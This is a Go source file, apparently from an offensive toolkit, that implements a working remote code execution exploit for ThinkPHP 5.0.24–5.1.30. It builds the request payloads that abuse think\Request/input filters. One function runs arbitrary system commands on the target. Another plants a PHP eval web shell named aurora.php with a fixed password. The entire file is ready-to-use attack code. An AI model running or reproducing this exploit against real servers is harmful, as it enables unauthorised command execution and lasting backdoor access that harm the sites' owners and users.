package thinkphp

import (
	"breach/internal/util"
	"io"
	"net/http"
	"strings"
)

type TP50245130 struct {
	BaseUrl       string
	moduleList    []string
	currentModule string
	feature       string
	checkStr      string
}

func (t *TP50245130) CheckVul() *util.Response {
	for _, s := range t.moduleList {
		resp, err := http.Get(t.BaseUrl + "/?=/" + s)
		if err != nil {
			return util.Fail(err.Error())
		}
		if resp.StatusCode == 200 {
			t.currentModule = s
			break
		}
	}
	if t.currentModule == "" {
		return util.Fail("no vulnerable")
	}
	payloadUrls := []string{
		t.BaseUrl + "/?s=" + t.currentModule + "/\\think\\Request/input&filter[]=phpinfo&data=-1",
		t.BaseUrl + "/?s=/" + t.currentModule + "/\\think\\request/input?data[]=phpinfo()&filter=assert",
	}
	for _, payloadUrl := range payloadUrls {
		resp, err := http.Get(payloadUrl)
		if err != nil {
			return util.Fail(err.Error())
		}
		bytes, err := io.ReadAll(resp.Body)
		if err != nil {
			return util.Fail(err.Error())
		}
		if strings.Contains(string(bytes), t.checkStr) {
			return util.Success(t.feature, payloadUrl)
		}
	}
	return util.Fail("no vulnerable")
}

func (t *TP50245130) ExecVul(cmd string) *util.Response {
	payloadUrl := t.BaseUrl + "/?s=" + t.currentModule + "/\\think\\Request/input&filter=system&data=" + cmd
	resp, err := http.Get(payloadUrl)
	if err != nil {
		return util.Fail(err.Error())
	}
	bytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return util.Fail(err.Error())
	}
	return util.Success("success", string(bytes))
}

func (t *TP50245130) GetShell() *util.Response {
	payloadUrl := t.BaseUrl + "/?s=" + t.currentModule + "/\\think\\Request/input&filter=system&data=echo '<?php @eval($_POST['aurora'])?>' >>aurora.php"
	resp, err := http.Get(payloadUrl)
	if err != nil {
		return util.Fail(err.Error())
	}
	resp, err = http.Get(t.BaseUrl + "/aurora.php")
	if err != nil {
		return util.Fail(err.Error())
	}
	if resp.StatusCode == 200 {
		return util.Success(t.feature, t.BaseUrl+"/aurora.php Pass:aurora")
	}
	return util.Fail("no vulnerable")
}

func NewTP50245130(baseUrl string) *TP50245130 {
	return &TP50245130{
		BaseUrl:       baseUrl,
		moduleList:    []string{"manage", "admin", "api"},
		currentModule: "",
		feature:       "ThinkPHP 5.0.24-5.1.30 RCE",
		checkStr:      "PHP Version",
	}
}
